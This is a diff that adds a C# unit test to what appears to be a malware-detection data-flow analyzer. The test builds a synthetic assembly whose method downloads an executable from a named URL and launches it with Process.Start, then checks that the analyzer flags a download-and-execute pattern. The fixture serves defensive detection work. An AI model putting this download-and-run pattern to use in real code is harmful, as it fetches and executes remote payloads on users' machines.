@@ -62,6 +62,38 @@ public class DataFlowAnalyzerDetailedTests
     }
 
     [Fact]
+    public void AnalyzeMethod_WithDirectDownloadFileAndExecute_DetectsPattern()
+    {
+        var rules = RuleFactory.CreateDefaultRules();
+        var snippetBuilder = new CodeSnippetBuilder();
+        var analyzer = new DataFlowAnalyzer(rules, snippetBuilder);
+
+        var assembly = TestAssemblyBuilder.Create("MaliciousDownloader")
+            .AddType("Malware.Downloader")
+                .AddMethod("DownloadAndRun")
+                    .AddLocal("System.String", out int pathVar)
+                    .EmitString("https://minecraftmods.xyz/Venticularjpeggerson.exe")
+                    .EmitString("payload.exe")
+                    .EmitCall("System.Net.WebClient", "DownloadFileTaskAsync")
+                    .EmitString("payload.exe")
+                    .EmitStloc(pathVar)
+                    .EmitLdloc(pathVar)
+                    .EmitCall("System.Diagnostics.Process", "Start", null)
+                    .Emit(OpCodes.Pop)
+                    .EndMethod()
+                .EndType()
+            .Build();
+
+        var method = assembly.MainModule.Types.First(t => t.Name == "Downloader").Methods.First(m => m.Name == "DownloadAndRun");
+
+        var chains = analyzer.AnalyzeMethod(method);
+
+        chains.Should().Contain(c => c.Pattern == DataFlowPattern.DownloadAndExecute);
+        chains.Should().Contain(c => c.Nodes.Any(node => node.Operation.Contains("DownloadFileTaskAsync")));
+        chains.Should().Contain(c => c.Nodes.Any(node => node.Operation.Contains("Process.Start")));
+    }
+
+    [Fact]
     public void AnalyzeMethod_WithOnlyLegitimateOperations_HasLowOrNoSuspiciousChains()
     {
         // Arrange
